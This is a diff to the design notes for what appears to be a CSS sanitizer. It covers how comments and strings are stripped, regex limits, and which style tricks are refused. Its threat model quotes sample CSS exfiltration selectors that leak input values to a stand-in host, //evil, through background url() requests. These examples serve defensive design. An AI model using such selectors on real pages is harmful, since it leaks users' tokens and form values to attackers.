@@ -89,7 +89,9 @@ author could do; none of them is script.
 - **An exact-match selector guess.** `input[value="admin"] { background: url(//evil/yes) }`
   leaks one yes or no per guess. Accepted as impractical against a token; the substring
   selectors that leak one character at a time are refused.
-- **Content size.** No limit; the check is one pass. Cap it at the form or the API.
+- **Content size.** No limit; time grows with the size and nothing else (every scan over content
+  is linear, and a regex that reaches the PCRE limit refuses the block instead of passing it). Cap
+  it at the form or the API.
 - **Sense.** Whether the text is blank, wrong, offensive or copied.
 
 ## Reject, Never Rewrite
@@ -320,15 +322,19 @@ url(//evil/a) }` leaks an input's value one character per request, and `@font-fa
 Exact-match selectors, web fonts without `unicode-range`, and external images in the element
 stay allowed.
 
-Comments and quoted strings are blanked before the regex runs (settled 2026-09-20). The
-corpus made the case: email templates draw comment banners with backslashes, and Word
-pastes quote font names like `'\@Yu Mincho'`, so the plain backslash ban refused ordinary
-content. Blanking reads left to right as a CSS tokenizer does, so `content: "/*"` cannot
-fake a comment opener: the quote comes first and the string ends at its closing quote. Two
-things stay on the text as written: the `url()` scheme check, since the target is usually
-quoted, and a backslash inside a quoted `url()` argument, since an escape there still
-spells a scheme. Past the PCRE limits (megabytes inside one comment or string) blanking is
-skipped and the text is checked as written, which is stricter. The token regex can reach the
+Comments and quoted strings are removed before the regex runs (settled 2026-09-20; removed
+rather than blanked to a space since 2026-09-21, because the CSS tokenizer drops a comment
+without adding whitespace, so `[*/**/|x^=a]` reads `[*|x^=a]` to a browser, and joining the
+text around a string can only add a match). The corpus made the case: email templates draw
+comment banners with backslashes, and Word pastes quote font names like `'\@Yu Mincho'`, so
+the plain backslash ban refused ordinary content. The removal reads left to right as a CSS
+tokenizer does: a string runs to its closing quote or a bare newline, a hex escape eats the
+whitespace after it, and an unquoted `url()` runs to its `)` and is stepped over first, so
+`content: "/*"` cannot fake a comment opener and neither can `url(/*)` or a quote inside an
+unquoted url. Two things stay on the text as written: the `url()` scheme check, since the
+target is usually quoted, and a backslash inside a quoted `url()` argument, since an escape
+there still spells a scheme. Past the PCRE limits (megabytes inside one comment or string)
+removal is skipped and the text is checked as written, which is stricter. The token regex can reach the
 limit too (megabytes of `x*|` pairs inside one `[`, on either engine); its false return
 refuses the block, since a false read as no match would pass it unchecked. The selector's
 name run stops at the next `[` and is possessive, so a run of brackets or of letters is one
@@ -340,8 +346,8 @@ Also settled 2026-09-20: `behavior:` matches only as a property name, so `scroll
 and `overscroll-behavior` pass. The `*behavior` and `_behavior` hacks old IE read still
 reject.
 
-Rejected: a full CSS tokenizer (MediaWiki runs one; the backslash ban plus blanking makes it
-unnecessary), and refusing `position: fixed` and `z-index` (a phishing overlay, not script,
+Rejected: a full CSS tokenizer (MediaWiki runs one; the backslash ban plus the removal makes
+it unnecessary), and refusing `position: fixed` and `z-index` (a phishing overlay, not script,
 and in every email template).
 
 ## `<style>` Is Allowed
